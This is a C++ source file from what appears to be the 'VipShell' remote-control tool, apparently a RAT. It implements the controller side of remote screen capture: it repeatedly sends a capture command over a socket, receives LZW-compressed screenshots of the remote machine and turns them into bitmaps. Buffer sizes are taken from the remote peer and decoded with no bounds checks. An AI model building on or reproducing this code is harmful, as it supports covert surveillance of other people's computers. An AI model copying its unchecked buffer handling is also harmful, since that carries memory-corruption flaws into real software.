#include "stdafx.h"
#include ".\servergetcappicture.h"
#include "..\VipShellInfo\lzw.h"
CServerGetCapPicture::CServerGetCapPicture(void)
{
	m_dwBufLenLzw = 0;
	m_pDataLzw = NULL;

	m_dwBufBitmaplen = 0;
	m_pDataBitmap = NULL;
	m_hBitmap = NULL;
	
	m_pCall = NULL;

}

CServerGetCapPicture::~CServerGetCapPicture(void)
{

	m_hServer.Close();
	if( m_pDataLzw)
		delete m_pDataLzw;
	if( m_pDataBitmap )
		delete m_pDataBitmap;
	if ( m_hBitmap )
		DeleteObject(m_hBitmap);
}

void CServerGetCapPicture::OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter)
{
	while(!m_bIsStop)
	{
		HBITMAP hBitmap = ___GetPicture();
		if(m_bIsStop)
			return ;
		if(!m_hServer.IsOpened())
			return ;
		if(hBitmap)
		{
			if(m_pCall)
				m_pCall->OnPicture(hBitmap);
		}
	}

}
bool CServerGetCapPicture::Start(CCapPictureCallBack* e)
{
	if(m_pCall)
		return false;
	m_pCall = e;
	m_bIsStop = false;
	NewThread();
	return true;
}
bool CServerGetCapPicture::Stop()
{
	CMySingleLock lock(&m_CriticalSectionStop);
	m_bIsStop = true;
	m_pCall = NULL;
	return true;
}
HBITMAP CServerGetCapPicture::___GetPicture()
{
	CMySingleLock lock(&m_CriticalSectionStop);
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETCAP;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return NULL;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR )
	{
		m_hServer.Close();
		return NULL;
	}
	if(cmd.dwCmd != CMD_ISOK)
	{
		return NULL;
	}
	cmd.dwCmd = CMD_ISOK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return NULL;
	__NewBufLzw(cmd.dw1);
	__NewBufBitmap(cmd.dw2);
	nRet = _RecvBuffData(m_pDataLzw, cmd.dw1);
	if(nRet == SOCKET_ERROR)
		return NULL;
	//	解压缩
	
	FCLzw lzw;
	memset(m_pDataBitmap, 0, m_dwBufBitmaplen );

	memset(m_lzw_STR, 0, sizeof(m_lzw_STR));
	lzw.SetStrBegin((LZW_STRING *)m_lzw_STR);
	lzw.LZW_Decode(m_pDataLzw, m_pDataBitmap);
	return __GetDataToBitmap(m_pDataBitmap);
}

bool CServerGetCapPicture::__NewBufBitmap(DWORD dwLen)
{
	dwLen +=  100; 
	if(dwLen <= m_dwBufBitmaplen)
		return true;
	if(m_pDataBitmap)
		delete m_pDataBitmap;
	m_pDataBitmap = new BYTE[dwLen];
	if(m_pDataBitmap)
	{
		m_dwBufBitmaplen = dwLen;
		return true;
	}
	m_dwBufBitmaplen = 0;
	return false;
}
bool CServerGetCapPicture::__NewBufLzw(DWORD dwLen)
{
	dwLen +=  100; 
	if(dwLen <= m_dwBufLenLzw)
		return true;
	if(m_pDataLzw)
		delete m_pDataLzw;
	m_pDataLzw = new BYTE[dwLen];
	if(m_pDataLzw)
	{
		m_dwBufLenLzw = dwLen;
		return true;
	}
	m_dwBufLenLzw = 0;
	return false;
}


HBITMAP CServerGetCapPicture::__GetDataToBitmap(BYTE* pDate)
{
	BITMAPFILEHEADER* pbmfh ;     // DIB位图文件头
	HBITMAP            hBitmap ;

	pbmfh = (BITMAPFILEHEADER *)pDate;
	if (pbmfh->bfType != * (WORD *) "BM") 
		return NULL ;

	HDC hdc = CreateDC(_T("DISPLAY"), NULL, NULL, NULL);
	// 创建DDB位图
	hBitmap = CreateDIBitmap (hdc,              
		(BITMAPINFOHEADER *) (pbmfh + 1),
		CBM_INIT,
		(BYTE *) pbmfh + pbmfh->bfOffBits,
		(BITMAPINFO *) (pbmfh + 1),
		DIB_RGB_COLORS) ;
	DeleteDC(hdc);
	return hBitmap ;
}